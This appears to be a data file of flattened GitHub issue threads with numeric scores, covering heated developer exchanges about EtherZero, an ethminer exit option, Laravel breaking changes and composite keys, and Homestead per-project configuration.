asked."" - I have asked it before  Shame on you as a Chinese. EtherZero is a global project, we have many supporters from China, also many supporters from all of the world. You are hurting the reputation of EtherZero, and provide nothing else to the world.  David, your sales employee, says you didnt pay him. He says you blocked him and banned him from the channel. Why did you do this? Are you going to pay him? He worked every day getting you ""investment"" while being told the cap was 116M. You take everyone's money first, fire your sales employee with no pay, and then you ""change the marketing plan"" and give yourselves 50% of the market in premined ETH? And you think I am worried you make up a conspiracy theory about me? I was interested in your platform -- it sounded good (0 gas fee, 999999 txps). You have no code though, and so I wrote it off as a scam and warned people.  He is not our sales employee, he asked for help being an group supporter on our telegram channel. And we have paid him  are not telling the truth, we also had your chat log with David, if you want we can upload more. You can do what you want, but we won't pay you a penny as mentioned here  I do mot want your moneu, guy. This has nothing to do with me. You lent David 0.1 ETH to buy a computer power supply. That is not his monthly salary. He is a european, he does not work for 0.1 ETH a month. I have my chatlog with David too, I was talking to him, worried that your company was a scam (which it seems to be!). You are hurting people you hired, who worked for you. You are such a fool. I am just one guy who thinks you are a scam, I am not important. Welcome to cryptocurrency where your project needs code and a meaningful whitepaper to not be a scam, tough I know. You have a contract with David, he was your employee, he made you money, and you are not going to pay him. Contracts do not matter to you. You change contracts as the market needs. You got millions in investment from 116m with no code, and then changed it to 197m today. You are so bad. ",48,0,387,0.25,0.125,507,25,
ethereum-mining/ethminer/1405,0.14445261,ethereum-mining,ethminer,Please stop screwing with Ethminer,8198,77,60,0.6153846153846154,2,"Please stop with all the changes. Ethminer was absolutely fine, ran and performed great. -FS exit is sorely missed here at my end. I see you have finally made amends by adding failover-timeout, which does indeed now move batch file on to next algo. -P exit did not do this, as it was advised to do! However with latest ethminer 16 dev2. A drop of speed of just over 1mhs for me. not impressed. Print out of speed and gpu speed (the same thing) what is purpose of reporting 2 speeds? why you feel the need to make changes that are not needed I dont get. etminer is, kinda was, a great miner. Now you messing around with it too much. How you have managed to mess something up that was in such great condition I do not understand. Just stop, get back to basics, sort it and leave it. This transition should have been simple.  How is -P exit different to -FS exit  should work as before and did last i checked. Also if you dont like the changes don't use the newer versions, use different miner altogether or fork and only do stuff you like in a miner.  no -P exit is not shifting batch file onto next algo nor is it behaving like -FS exit. Why do you think they have added this &gt; failover-timeout this command now exits ethminer and onto next miner. without that ethminer just loops trying to reconnect with -P exit or without.... my batch is for multi algo on mph.  1.) Report an issue and use an appropriate subject and fill it with constructive content 2.) 0.16.0.dev2 (remind the dev2) is a development snapshot - means current source compiled and bundled 3.) If you would supply us with more info like OS, GPUS, ethminer --list-devices, ... possible we can help better  getting back your missing 1MHs! 4.) failover-timeout is the time after that ethminer tries to reconnect to the main pool which is the first -P parameter (you must not specify the failover-timeout parameter !) 5.) Maybe you can explain more detailed what has changed and make problems as I still not understand Would be helpful to get (at least a part) of your batchfile to understand what's the problem 5.) If you like the old versions you can  download them at  the repo, go back in history and compile your preferred version  6.) Create PRs or Issues and submit us your sorted basics  the changes required to compensate for the mhs loss makes no difference. as the speed would be and is faster on v15, with any increments in power to gpu than v16. i got speed back. at same settings is over 16mhs on v15.... gpu is rx480 8gb ref. Al I want ethminer to do is what it did before and that is the -FS exit function. It is required to exit ethminer. I run a batch file that switches algos based on profitability, as i am sure a lot of other users do too. -P exit is not doing this for ethminer. Im terribly sorry I think I made a mistake regarding failover-timeout. I am currently testing it out and waiting on an algo switch. Im sure it did it, not 100% though. my apologies.  To have the miner exit (with -P exit) imidently after a disconnect (of any kind) you need to use --farm-retries 0  (i think thats the param) otherwise it tries to reconnect up to 3 times to reconnect to current pool before switching to new pool (which is in our case the exit command)  nope. ethminer just wont exit and move onto next algo/miner in batch. -P exit, --failover-timeout 0, --work-timeout 1, --exit, --response-timeout 2, --farm-retries 1 none of these work. just keeps looping trying to reconnect to ethash algo. and none do what -FS exit did.   Can you repeat the very same test with 0.16 please ?  And please remove --failover-timeout as it does not apply to your environment.  Also would be helpful if you could post the ""full"" command line arguments. it's not clear if you tested those one by one or in some sort of combination.  that screenshot is from latest v16dev2. those commands were entered individually. they are a list not an order  You should then test with  does that work for you? as it is not for me. ive exhausted all combos with the above. i will wait it out and see what v16 final is like. back to claymore for now (  Could you please report what is the output of ethminer.exe -V I am asking as the output of your screen-shot does not appear to belong to 0.16  sure my mistake. same thing though.   Think I got where the problem is. Please one more last test  Nevermind ... it won't allow --farm-retries 0  did you test that before you posted it? I have done that. before i even came here to make this post. if you had tested it you would not have posted it. by looks of it you have not even read the help files. im done with this for now.  First of all please calm down. We're here to help. I'm not here to undergo your rude attacks. I'm one of the devs and just now I am addressing this specific issue. (In particular I'm the one who has made most of the changes in the stratum protocol detection). So please, again, calm down and be patient.  ./ethminer -G --report-hashrate --HWMON 0 -P stratum+tcp//mhubaccount.workerx@friend.ethash-hub.miningpoolhub.com20535 --api-bind -3333 --cl-local-work 64 -P exit Results to this  think u are using wrong port number.  as far as i understand, what he wants is, that the miner exits after it gets disconnected from the pool for whatever reason. (pool closed, network error, whatever) I think that was the behavior with -FS exit.  So we should allow --farm-retries 0  and hint about that within the -P exit  command desc. I also would suggest renaming --farm-retries to something different (or alias it) like --pool-retries or something.  @friend is right. There are some topics to take into account  --farm-retries should allow 0 which means no-retry at all on a failed connection ... step to next in queue actually there is a missing check on failure for mining.authorize method which does not invalidate connection. It should instead vector of connections should be accessed by the at() method instead of direct random access [] as we're removing invalidated connections. Direct random access [] does not throw if out of bounds while at() does. Problem is vector.erase method apparently rearranges it's internal array   Figure this where you have a vector of 2 elements (thus size() is 2) you'd expect vector now holding only 1 element (and in fact is) after removal of the first (of two) element. But here comes the problem. If you access vector like this  ♠cout &lt;&lt; m_connections[0].Host();` instead of getting the first (and only) element left (which should be reasonable) you get some sort of unspecified behavior which outputs data from some randomly allocated memory.  Correct, but this doesn't excuse the issuer's behaviour.  @friend my behaviour? I am just tired with users like you who post nonsense. wrong port? really? what a waste of your time posting that message only to conclude that I am using wrong port.... you are wrong. @friend I am calm (do you see any caps or exclamation points?. was more bewildered than anything when I read your reply. you said to try something that does not work and is not a valid setting for that command.... @friend most sense relating to -FS exit function I have read. thanks  Well your choice of words for the initial issue. Instead of filling out an issue ticket based on the template and describing the problem -P exit does not work for your use-case, while -FS exit worked before,  You did a bit of a rant )  @friend ... there are many ways to appear rude and those do not necessarily imply usage of capital letters or exclamation points. Everyone here uses his/her time on voluntary basis, not being paid, only guided by the desire to help and to improve. Full stop. We do not owe you anything and you don't pay anything for using this software. This said I apologize for giving you a wrong advice but have you counted how many lines of code there are and how many devs contributing ? Sometimes, as we're all human, we make mistakes or, simply, do not recall well which was the correct syntax and/or range of values. If you do not understand this please stay with Claymore which, as you pay a fee for it's usage, should give you a SLA. But I am pretty sure there's not ! This ticket is closed and on hold. Bye. ",23,6,364,0.23076923076923078,0.15384615384615385,133,13,
ageitgey/face_recognition/311,0.18437235,ageitgey,face_recognition,module naming,366,4,1,0.6666666666666666,0,seriously some of us are drunk why do you have to name it face_recognition do you know how many time i have to hit backspace just to type that right why the fuck you cant just call it frec or facer seriously facer sounds so much cooler anyways. better have a damn good answeer. the fuck u think this is? a game?  User blocked and reported  User blocked and reported ,0,0,5,0.3333333333333333,0,2,2,
otland/forgottenserver/2494,0.5517184500000001,otland,forgottenserver,monster look direction,1006,14,1,0.7,2,"Expected behaviour  behaviour  And the problem is?  @friend  try it out yourself and compare with the image i provided, you can do so by trapping a monster and walk around it and see which direction it is facing. the problem is that the direction is not coded correctly for monster in some squares.  @friend You are filing a bug, i think you should post both expected and actual behavior. You posted expected in an image. Then post the actual in a companionable image.  @friend or you can just recode it after the expected image, i don't see a point in making another image of the broken code (which i did include btw). feel free to spend that time yourself making the image if you really think it is needed.  You are reporting a bug and expects that we try based on a image?! Please provide more information about it and not just a stupid image that you think that it should be.  and you expect me to sit another 30min to draw you a picture instead of just clicking a link that takes 30seconds. wtf dude? ",4,0,22,0.1,0.2,7,4,
laravel/framework/24848,0.237775175,laravel,framework,tiny bracket issue,801,4,13,0,5,"♠ Please use this issue tracker only for reporting Laravel bugs.  If you need support, please use the forums  -   -  you may use Slack ( or Stack Overflow ( you would like to propose new Laravel features, please make a pull request, or open an issue at  Version 5.6  Description Authentication problem due to syntax error. Steps To Reproduce in framework/src/Illuminate/Auth/SessionGuard.php file on line 380 change fromreturn !(is_null($user) &amp;&amp; $this-&gt;provider-&gt;validateCredentials($user, $credentials));`  What's the problem? Your suggestion completely changes the behavior of .  sorry my bad, this attitude always return true but ♠$this-&gt;provider-&gt;validateCredentials($user, $credentials)` part is always returning false even credentials are true, I couldn't figure it out why ",3,0,59,0,0,22,2,
laravel/framework/2513,0.08545762500000001,laravel,framework,[Request] Form number input helper,935,4,7,0,3,"Can we get some form helper for Laravel for the likes of &lt;input id=""movie"" type=""number"" value=""0""/&gt;  More info on the number input at  Is this too hard?  Don't need the attitude. If you look at the form helpers, there's a pattern [[ Formtype ]] Formtextarea Formtext Formselect So I suggest Formnumber  It should be merit to ask if the existing structure if too hard to implement or too limiting which need to result for an alias to be added. Anyway it been asked/request before and the response was  Alrighty then. This would hardly be an alias though of something already there, it would just be a new helper.  Formnumber only if you to create the method inside of FormBuilder. You should call {{ Forminput('number', 'name of input') }}  You can use this file to create alias for the remaining 11 HTML5 elements (email &amp; URL are enabled out of the box)  enables Inputdate('input_name', 'input_value', $options_array), etc ",6,1,57,0,0,31,1,
laravel/framework/26340,0.3231665,laravel,framework,Are we still doing breaking changes in minor releases?,5268,49,48,1,2,"So back in January I created issue #22833 wondering about the state of releases since many of them contained breaking changes. Now since the release of 5.7 it seems the situation still hasn't improved. For example, in the 5.5 changelog we can see 5.5.43 has a change which states Now, excuse me if I am being stupid here, but on Laravel's own website, it says The worst part is that this was only reverted 32 days later, after people had already upgraded and then had to revert those changes back to the old way. I cannot understand how/why this was ever accepted into a minor release when you clearly state breaking changes should never occur in minor releases. Notice the 'never' in bold right there. However, in 5.5.40 we saw In 5.7.11 In 5.7.8 5.7.5 My advice to people using this framework don't upgrade minor versions, if you do things will randomly break, and a revert could be sent in after a month causing another breaking change after people had updated the framework, adapted to the breaking change and then had to revert those changes again. Completely amateur and taylorotwell clearly does not care about 'breaking the user'. Maybe he needs a chat with Linus Torvalds.  You're right. They shouldn't contain breaking changes. Unfortunately with such a large user base, edge cases will happen and things will slip in. When we're notified about those we do our best to revert those changes back and undo any wrong-doings. Sometimes this means that some time can creep in between the released breaking change and the fix. Software development can be hard and by no means we intentionally want to break people's systems and apps. Software without bugs doesn't exists and is a myth. But we do our utmost best to keep these breaking changes to a minimum. This couldn't be further from the truth. If all you're going to do is complain then please refrain from opening up issues. Use  if you want to propose a new release schedule and have a civilized discussion about it.  @friend thanks for closing the issue and completely removing the chance for meaningful discourse. I admit I come across strongly only because I reported this in January and we're still seeing the same thing release after release. Yet you didn't address why the changelog has, in capital letters ""BREAKING CHANGE"". How those words ever made it into a changelog for a minor LTS release is beyond me, then it was reverted after 32 days... This was quite clearly, quite obviously intentional. We're not talking about bugs here, which are understandable, but people making PR's without realizing the impact they have on actual end users and applications. Instead, you bury your head in the sand, pretend the issue doesn't exist (or more obviously, you don't care) rather than trying to figure a viable medium, such as what I proposed before RC's or betas like most semver applications. If Taylor cared, he'd stop shipping as often and actually test his releases, but as it stands, we get reverts every 3 or so releases. And so it will continue. I have no doubt I'll be back for 5.10 or 6.3 and the same merge-oops-it-broke-revert system you guys have going will still be in effect.  A few things to note. The ""issues"" for this repository is for reporting bugs. The laravel/ideas repo is for these discussions. This is why the issue was closed. Secondly, you make some good points, but as a long time user of other large frameworks, breaking changes slip through sometimes, then get reverted. Last, you should never update composer dependencies on a production project without fully vetting in a dev environment. Even patch, now called ""minor"", releases can have occasional breaking changes with regard to bug-fixing and security. Blindly running composer update without checking the changelog or ""releases"" page, is a recipe for disaster. If the changelog isn't clear, look at the actual commits. If your app is that important, you should at least scan every change that is made to the code base before using. Even so, there could be more time available for PRs to be vetted by the community to help recognize breaking changes before the code is pushed.  Some of the unfortunate breaking changes could have easily been avoided. Or, at least, the filesystem change break. When I first saw the PR it had alarm signs all over it yet this was done on 5.7 (and merged and reverted, etc.), rather on 5.8. For my taste, way too much things are ""changed"" in minor version. Except changes to tests, I think half of that stuff should go in 5.8 or master. But understandably, contributors are eager to get their stuff out and in again on their project due to the rapid release and this attracts contributors. But here we've good/strong react from the other side, off-putting/discouraging. A fun little Epiphany I just had because I commented on   people go ~berserk~ totally strong on all the fiddle formatting rules, yet breaking changes rather easily creep into releases… |  @friend they don't care otherwise they would implement changes to ensure breaking changes are impossible (RC's and betas for example). Guess it's easier to merge and revert users be damned. Shame but it is what it is, they're not good at taking criticism that hurts their egos, especially Taylor who seemingly can do no wrong... ",23,10,178,0,0,99,0,
laravel/framework/26828,0.168803098,laravel,framework,Eager loading with specific fields should include Relationship's keys by default.,1508,5,14,0.5,3," Laravel Version 5.6.29 PHP Version 7.1.21 Database Driver &amp; Version MySQL 5.7  Description  above warning seems to be not accurate since not only the 'id' column must be included, but also any other 'foreign key' and 'local key' of the relationship being eagar-loaded, otherwise it'll fail without them manually specified. First off, the documentation is warning users about the usage inaccurately. Secondly, it seems unnecessary for us to manually specify the foreign &amp; local keys when using ""with()"", since the ""relationship"" already dictates their necessity in facilitating the eagar-loading. Why not just automatically include them by default? Steps To Reproduce  Heya, unfortunately we don't support that Laravel version anymore. Can you please try to upgrade and see if the problem persists?  The quoted documentation clearly says 5.7 correct? It does say we need to manually specify id instead of automatically handled by the framework, correct? So why is this closed so quickly merely because I stated an outdated version? I can test any way I choose to but this quick closing of an issue is not allowing healthy discussion sadly.  @friend you've reported an issue for Laravel 5.6  This idea has been declined  @friend everyone knows that, and you've closed it, heh.  @friend we don't support 5.6 anymore  There have also been multiple (unsuccessful) attemps to improve this sentence in the documentation.  If all you're going to do is complain then please refrain from posting issues 🤷🏻‍♂️ ",4,0,58,0,0.25,33,5,
laravel/framework/5355,0.087617948,laravel,framework,[Request] Eloquent should support composite keys,14762,220,123,0,0,"Eloquent assumes heavily that you are using surrogate keys on your tables (the  field in every table). However in real world usage, particularly older database systems not designed with web frameworks in mind, there are often tables with composite keys. That is, the primary key is over two or more columns. Often, you can't just add autoincremented id's. This is definitely a game stopper for a lot of use-cases, where you are forced to access existing RDBMS (e.g. building a frontend for an existing db). See also this reddit post about this issue. The schema builder has already support for composite keys, however eloquent doesn't seem to support it yet. I request the feature to use composite keys in your eloquent models and queries. The default configuration for surrogate keys is fine, just add the option.  I would like to have this supported too.  Me too.  I agree, this is extremely annoying at the moment. Unfortunately I'm not in charge of a lot of data I need to access. For the moment, I'm just overriding  in my models by doing something like  @friend this is a good workaround. So did you specify  with one field and added the second field as a where-clause in the newQuery method?  You could view my bug report (#5517) which has a work-around that works flawlessly for me.  @friend Yes, that is exactly what I did. In my case I was using a  and a bunch of child classes that extended my , so I had a  and a .  I would really like to have this supported as well.  I put this in my Eloquent Model subclass to enforce my extra column ('locale').  Maybe it'll help someone. ♠php     protected function setKeysForSaveQuery(Builder $query)     {         parentsetKeysForSaveQuery($query);         $query-&gt;where('locale', '=', $this-&gt;locale);         return $query;     }  plus one I just get an common error while saving model with composite keys♠`  I want it!  -1 This is not ""should"" stuff. Please keep Eloquent simple. As you mentioned, query builder supported it, so it is enough. Don't do every thing by Eloquent. Just use query builder, results became collections in L5, so what problem?  I doubt this will ever happen.  Why do you doubt this will ever happen? Composite keys are extremely common, if the SchemaBuilder supports it why wouldn't you want to have it supported by Eloquent as well? Sometimes using surrogate keys are wasteful, especially if you're using UUIDs as identifiers... having a useless column you never search on that just takes up table &amp; index space is silly sometimes. Keeping Eloquent ""simple"" is a very silly reason. To the end-user nothing changes - but they now have the ability to specify an array for the primary key. If Laravel/Eloquent really expects to be taken seriously and provide further credit for using PHP for web development it should naturally support what every other ORM supports for alternative web development libraries. Using pivot only is doable when you have a few extra columns on your relation... otherwise it's very awkward. Using the query builder for saving &amp; deleting is kind of silly, why would anyone want those inconsistencies in their code? Some places you use Eloquent for saving/deleting and some places you use QueryBuilder? This kind of attitude is poor and sounds lazy. If Laravel is open to receiving a feature like this, I would be more than willing to supply a nice simple and efficient solution.  plus one Maybe in 90% of my projects I use composite primary keys. For localisation and for one to many relationships composite keys is the best practice for me... I'm very dissapointed that in Laravel 5 there is no composite keys, but a lot of complicated design patterns. That is my opinion. Don't want to argue with anyone.  Eloquent follows the Active Record convention, so it needs a single primary key to work. If you need composite keys in your project, maybe Eloquent isn't the best tool for it.  The Active Record pattern makes no restrictions about primary keys - I don't know where you're getting that from. Eloquent/Laravel is currently developed to work with a single primary key, there's no reason why someone shouldn't be able to make a contribution to the project which adds composite keys. What is the best way to go about this?  All I'm saying is that this is a convention in other frameworks as well. Since Rails made it popular, the other frameworks followed the same path, that's what we see out there with most PHP frameworks (except Yii 2, for what I know). Don't get me wrong, I would love to see Eloquent working with composite keys but I agree with Campbell, we're not going to see that happen so soon and my opinion is that I don't think it's worth the trouble. Well, only Taylor can tell )  If the current contributors aren't interested in implementing this feature, I'm more than willing to submit how I'm going to solve it (so I don't waste my time and have it be later rejected) - I just don't know who exactly to message to get the go ahead to work on it.  Please pose questions to Taylor. He's the only one that can say yes/no to proposals.  As things stand, this issue is rejected, so it's unlikely for this to make it into the framework.  @friend are you willing to accept a pull request for this proposal?  @friend please respond, I'd love this  Just hit this bump as well. Would love support for composite keys.  I want this feature badly.  This seems like a package waiting to happen more than something that needs to be added to the framework. I agree with @friend . Just switch out your ORM to Doctrine 2? Is that a logical solution? Article here Doctrine Composite Keys  Yes this would be great to have.  I would also love to see this being implement within Eloquent.  Why would it be rejected as a proposal? If the $primaryKey property could be an array of columns it would be awesome.  plus one for composite primary key support  More one L5 user needs composite key =&gt; me !!!  Its works!!!  I ignored the model of the relationship table and set ""belongsToMany"" in the two tables with a little details set the two  foreign key of two tables and set the name of the relationship table. The whole foreign keys will works like a composite key. Ex //--------- Model ""Table1"" ------------// class Table1 extends Model { ... public function table2()     {         return $this-&gt;belongsToMany('App\Table2', 'table_relashionship', 'id_table2', 'id_table1');     } } //--------- Model ""Table2"" ------------// class Table2 extends Model { ... public function table1()     {         return $this-&gt;belongsToMany('App\Table1', 'table_relashionship', 'id_table1', 'id_table2');     } } Now the Eloquent undestand that you have a 'table_relashionship' in your database with columns 'id_table1' and 'id_table2' and you can access the data with the comand $table1 = Table2find(1); dd($table1-&gt;table2) Its solve my problem!  plus one for composite primary keys. In my opinion, using composite primary keys gives more clarity of the code as it shows that it is a dependent model (aggregate) of an entity model. Thus,  the dependent model cannot exists without its parent entity (or the aggregate root).  I am BAFFLED by the decisions being made. This is a COMMON practice in database design, and pushing people to hack their table designs to work with eloquent rather than support such a common practice is insane to me.  @friend to be fair, it is not supported by Rails either. It is not as if every major framework supports this and Laravel is refusing to.  @friend I'm in the same camp, I realize it's not a super requested feature, and even less so with new developers. And true, lots of other frameworks haven't done this either. It's actually a great thing that people are asking - what I hear them saying is they want to use Laravel! I feel like there are a few options for those of us in need of this functionality 1) Don't use eloquent, use query builder instead. 2) Don't use eloquent, use a different ORM like doctrine 3) Fork Eloquent to a new project and update it to support CK - let those that need it pull from that repo. Taylor can you share your vision of where Composite Keys fit in Laravel long term? i.e. Are CK's something you see as desirable, just further down the roadmap? Or are CK's something you feel are not a good fit for what you're trying to do with Laravel?  Jack   I currently have no plans to implement composite key support. On Thursday, June 25, 2015, Jack notifications@friend.com wrote  Thanks Taylor, I appreciate the clarity!  Extend Laravel, make a package, release it and then all the peoples can use it. Just because its not part of the framework doesn't mean this can't be done.  @friend A fork might be more appropriate. I've looked through all of the code myself and refactoring it to include composite keys provides an opportunity to clean up the code a bit (all of the joins due to relationships has a lot of repetitive string concatenation code). I think if you write out the few different ways to add conditions &amp; joins to a query in separate methods (on a new class?) it will give you a single place to handle the composite key logic instead of all over the Eloquent code base. Just my 2c  @friend Agree 100%, still a little way to go (I was crazy busy last week) but I've made good progress so far. I'm updating the database tests as I go which is a big time sink.  I would enjoy seeing this myself too but I'm okay using the query builder to get the job done. It means I will have to update the timestamps myself but nothing major.  @friend I tried using query builder and I've got it working, but it's a ton more work, since you can't just assign the request data to the ORM to have it save a new record. So lots of mundane code to assign each and every field. @friend How is progress going on the fork?  I've considered trying doctrine, but I think a fork of Eloquent would be easier to use.  It's confusing that the builder can create primary composite keys while the Eloquent can't, kind of inconsistent, isn't it?  @friend Not really. I'm pretty sure there are people who use the schema and query builder without Eloquent models.  @friend I'd argue that it's actually quite a disconnect between two integral parts of the framework.  One can build schema in such a way that it can't be used with the existing Eloquent API. It feels like a fight with the tooling, which is a red flag to me. The fact that these tools can be used independently is great but I think they should work together with feature parity in the first instance.  plus one for composite primary keys.  Me too. plus one for CK.  I was just silently listening this thread for a year, still nothing new? I'm playing with the idea of coding an Eloquent extension specifically for supporting comp keys until this feature comes out.  this should be locked  lol - I don't lock issues anymore because it causes massive rage  Why should this issue be locked?  Because of what Taylor said about this feature  So just because other frameworks don't support it means Laravel doesn't need to? In fact I would think this would be a driving force TO support it since it will be yet one more feature it has that other frameworks don't.  I (and a lot of others) totally agree with you. It's quite a common thing to use in database tables that simply don't require a 'id' field.  Taylor's response is interesting. It could one of a few things.  He doesn't think Laravel can/should be better than Rails. He knows this is an excuse for not wanting to do it himself. Could be lack of time or passion. He protests the idea of composite keys, because some folks actually think you should always have a surrogate key.  I don't mean to pick on him, he's done fantastic work, but with all of the support this issue has gotten I think we need a well thought out reason on why Laravel will never have composite keys OR, even better,  what can be done to get this done. After assessing what needs to be done to get composite keys working I can understand why he would want to avoid it. I think it would lead to a very healthy refactoring of the relationship classes. As I've said before, If he's willing to accept a patch for this feature there are many people who want to work on this. If he's hesitant because he has specific things in mind for this feature - or lines he wouldn't want crossed, he could communicate them to us on this issue. Outside of my work in PHP, ALL ORMS I've developed or used in the real world supported composite keys (Java might've spoiled me) so I find other libraries being hesitant a little odd. As I've said before, Laravel to me completely legitimizes developing large and well architected websites in PHP. The company I work for has used it dozens of times for small to large clients. It's definitely one of my favorite frameworks - save this one thing. Laravel's tagline shouldn't be ""At least as good as the competition"".  @friend I don't think @friend would reject if you/anyone can come out with a complete Pull Request to add composite key support for Eloquent. You can't expect someone that doesn't use composite key him/herself to create such feature. I myself would never consider making that PR because I don't have all the knowledge to cover all possible use case.  I rarely use surrogate key if it's meaningless, and I use composite keys a lot in applications. I don't see a good reason to force using surrogate key. So please support composite keys in Eloquent.  May be if we collect enough ""plus one"" I will make the solution  Guys this is ridiculous, while I really enjoy working with Eloquent, the idea of adding a completely useless column just to ""make it work"" is unacceptable. This is such a no-brainer, Doctrine 2 does have native support for composite keys as well. Why not Laravel?! plus one!  I would like composite keys plus one  plus one for composite primary keys, there's no good reason to force using surrogate key, is there? In addition, the fix proposed on #5517 is ridiculously simple and works flawlessly, I don't see why you wouldn't merge it on master. A pity.  Composite keys are really useful in use cases where you have an NxN table with a High read and write throughput. I guess one could argue in that case you don't use auto_increment, you should use a hash as primary_key instead of integer and suck it up using an UNIQUE constraint, but in my point of view this ""workaround"" is not the ideal scenario for a situation like this, it just creates confusion in something that should be simple.  plus one I put here my own solution I'm using a Abstract Model which one final model has extended and in his private property of primaryKey I declared an array with the name of each field on my composite key.  This is just sad. plus one for all its worth... ",70,29,606,0,0,387,34,
laravel/framework/6531,0.04774762875,laravel,framework,[Proposal] Allow per-project installations for Homestead 2,15054,189,92,0,3,"With the rewrite of Homestead v2, it is now considerably more difficult (if not impossible) to share development environment code on a project. One of the key benefits of Vagrant is committing the  to a repository and thereby having all developers working from the same environment. (Isn't that the whole point of Vagrant?) But with Homestead 2, all your config lives in your own personal  directory, and is non-shareable. I was never really a fan of the instructions for Homestead 1 which advocated using a single, central clone of the homestead repository. (Am I really the only one who uses separate homestead boxes per project? Do other people prefer not to segregate environments? That's like developing on our own little shared hosting boxes, allowing different project code and installation requirements to co-mingle.) But at least with the original Homestead it was possible to put the homestead files inside your project's repo (I used , since I'd customize the provision scripts.) With Homestead 2 and , the ability to customize the environment is getting better (and somewhat more reproducible), but taking a huge step backwards in shareability. While bundling homestead commands as a composer project is great, further centralizing config seems to be taking Homestead in a wrong direction...  After further thought, I've come to believe Homestead is designed around having developer-centric environments, as opposed to project-centric environments. Which seems entirely backwards to me. Sure, it works if you're developing a very basic application* and the stock Homestead install works out of the box for your project, or if you're working alone. But I've worked on very few projects that have the same server-side software requirements or are limited to a single developer. Need to add elasticsearch? Switch to MariaDB? What about build tools other than grunt or gulp? Want to use the awesome maildev during development? Homestead allows you to customize your development environment, and do so in a way that isn't affected by your host system. But it doesn't allow you to share those customizations. Which is a huge step backwards from the massive improvements (and productivity gains) Vagrant has brought to the development process. * I assume some will argue that the default Homestead box is designed to work with Forge, which is very probably true. But will Forge really never get the ability to add provision steps and add customize server environments during deployment? Maybe not, but if not, it will remain relatively niche. I love Homestead and Forge because they provide clean, solid base environments on which I can develop. But if I have to give all that up and start from scratch as soon as I need to customize my environment, that doesn't make me code very happy. I hope we can figure out a better way to manage development and deployment environments using the full power of the tools we have...  Couldn't you still use a subtree for the latest version though? The repository is still there laravel/homestead I'm sure you're not required to install the global Composer package and use the  command.  Not really. The Vagrantfile already assumes a  directory. And I can only guess it's going to go more down this path. On top of that, the subtree solution isn't a great one to begin with. It's hard to maintain as soon as you need to make changes to the Vagrantfile or homestead.rb, in which case you're basically giving up on future upstream changes. Which, from what I can tell, is one of the reasons for the changes in Homestead 2. But I just think it's limiting Laravel development more than expanding. What I'd be hoping for is more of a modular system, where concepts like  are a bit more flexible and can be loaded from a project (or also a home directory if desired). Something like the way  and other configuration systems work, maybe using Vagrantfile inheritance. It adds complexity, but there's no reason it needs to be exposed to most developers. If working out of a single shared box is fine for your needs, great. I just wish Laravel offered support for better practices from the start.  Ah you're right. I didn't even take a look in there. I agree that more flexibility for more advanced developers should be as big a priority as making it easy for newer developers to quickly get up and running. But I'm hardly one to comment on how it would be achieved as I'm not exactly a pro at Vagrant or provisioning servers. grinning  I was about to propose a way to fix this in your  file you could have a  (name negotiable) array that has file paths to the root of a laravel install and it can read the a  for the site specific stuff like provision scripts and database names and site public directory and local url just an idea I will be ready to submit a pull request later about this  Agreed, I prefer to have separate boxes per project and am currently rolling my own solution as well.  Homestead 2 indeed makes this more difficult.  I want my project to configure the box.  @friend That would be an improvement over the status quo, but not really go far enough to be too useful. How many settings can you really put into ? I mean, all of them benefit from being project-specific, but are less important settings that be maintained by all developers across a project (though I advocate they absolutely still be shared settings). At a minimum,  and  also need to be able to be project-specific, but this would be much cleaner if these two extra script files [had been implemented as part of Homestead.yamlHomestead.rbVagrantfile~/.homestead/Homestead.yamlhomestead upHomestead.yamlafter.shaliases` if they exist. That would be much closer to a more flexible system that could still work the way it currently does if users want that (though personally I'm not a fan of recommending developers use a shared host model at all).  @friend @friend most people using homestead don't need all of the customisability of vagrant, they just go  and everything works for them I think homestead is targeted to people who may be a bit scared of the command line and prefer to work with things that they can see if you want to run a application per vm then I think you should be using just normal vagrant this is where is was trying to go with my changes now to configure homestead you will just edit the  in the project directory and not have to find it in a hidden folder or run a console command and I was going to add a way for homestead to add that project file path by its self  maybe with  and then it will add the current working directory to the  array and look for a  in that directory for the settings used by that project  maybe even if homestead included the laravel installer so that running  it could install a new version of laravel and then add it to homestead automatically  Using words like ""most"" is ill-advised, as you have no way of knowing that. However, my main issue isn't that these changes to Homestead occurred at all, it's that they occurred in a way to make it unusable for those who do need more flexibility. Your proposed changes will help, but don't offer enough flexibility. Purestead does, but is a complete fork and therefore I'm not sure the benefit. I'll probably get around to extending Homestead using proper Vagrant inheritance...  @friend, I totally agree with you. The way homestead is going on is making it more difficult to share customized projects with a team. Will be much better if it follow the vagrant approach or as you say adds more flexibility of configurations per project.  Definitely agree with this. I've got many clients and many different projects; the beauty of Vagrant is being able to share those development configurations with the team, and to limit the impact of one environment on another. With Homestead 2 those key benefits no longer exist -/ Purestead looks like it might be a better option for now. First I've seen of that; will be trying it out.  plus one Homestead seems to drift away from the core Vagrant principal of discreet project server environments, for reasons I'm yet to understand.  plus one Agree with this. It's a nice idea, but it would be great to have the option to use Homestead as a standalone vagrant project as well.  I agree with this as well. It would be great to have a .homestead.yml file per project. It could work like Vagrant does.  would create a homestead.yml in your project root folder (similar to  ) instead of using a global file. For now, I am using only the homestead box directly with vagrant.  Project specific Homestead environments are absolutely critical for our workflow. We will quite simply not be able to utilise Homestead as it stands at present.  So question  if you want homestead to work like vagrant why don't you just use vagrant?  The last commit on  was today so it is being worked on and it uses the same Box that Homestead does so it is the exact same software stack  i think, the discussion ""if you want homestead to work like vagrant, than use vagrant"" leads to nowhere. An example? Laravel (git)ignores the vendor dir per default but the default vm for laravel gives us no direct automatism to install the vendor dir?! Every team - my team, team of @friend, etc. - needs to implement provisioning additionally for getting even the minimum of loading the vendor dir.  @friend I find your ""I work this way, and so should you, or go elsewhere"" attitude to this issue unconstructive and opinionated. ""Use another product"" is not an appropriate response to this issue.  Because the product fits your needs does not make it appropriate for everyone, especially when the issue is with functionality which has been removed.  I've experimented lot's of frameworks since ruby on rails first came out, maybe 10 years ago from today, and what I like and amazed about laravel is there's a decent answer to virtually any common problem (which is the definition of a framework), without sacrificing flexibility and with great documentation. Homestead is a good utility for building up the dev. environment but it sacrifices some flexibility this time and I believe this is a very common case. Yes you can always set your own vagrant box or use an alternative but that's what we do with zend framework or symfony or any other popular framework, isn't it?  I agree it's a missing feature. Vagrant supports multiple VMs per environment. Maybe this can somehow be used to allow for per-project VMs?  I'm not saying you cant use homestead I'm working in a group of 3, so homestead wouldn't work for us because if one person makes a change  like installs Mongo how do you handle that?? homestead as it is, does not handle stuff like this, so I made some changes to homestead and just copy them into the root of my project you can see my changes at  is more customisable and all configuration is now in the repo if you want mongodb on your vm just write a create-mongo.sh in the scripts and 